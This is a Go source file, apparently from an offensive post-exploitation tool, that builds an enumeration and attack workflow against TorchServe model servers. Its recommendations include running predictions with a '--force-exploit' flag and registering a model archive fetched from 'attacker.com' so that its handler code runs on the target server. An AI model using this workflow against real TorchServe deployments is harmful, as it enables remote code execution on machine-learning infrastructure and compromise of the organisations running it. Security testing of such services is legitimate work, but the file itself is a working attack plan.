package main

func buildTorchServeEnumWorkflowPlan(target string, modelNames []string) workflowPlan {
	target = canonicalServiceURL(target)
	model := shellSafeArg(firstOrPlaceholder(modelNames, "<a-discovered-model>"))
	recommendations := []workflowRecommendation{
		newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" models --model "+model), "Get detailed model configuration.", false, 10),
	}
	if model != "<a-discovered-model>" {
		recommendations = append(recommendations,
			newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" predict --model "+model+" --payload '{\"data\":\"test\"}' --force-exploit"), "Only after read-only inspection confirms the right model.", true, 20),
			newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" register --model-url http://attacker.com/aipostex.mar --model aipostex-handler --payload '{\"data\":\"test\"}' --force-exploit"), "Register a named archive and invoke it to verify the handler path executed.", true, 30),
		)
	}
	return workflowPlan{
		Target:          target,
		Stage:           "enum",
		Rationale:       "Model discovery should flow into detailed inspection and prediction testing.",
		Recommendations: recommendations,
	}
}
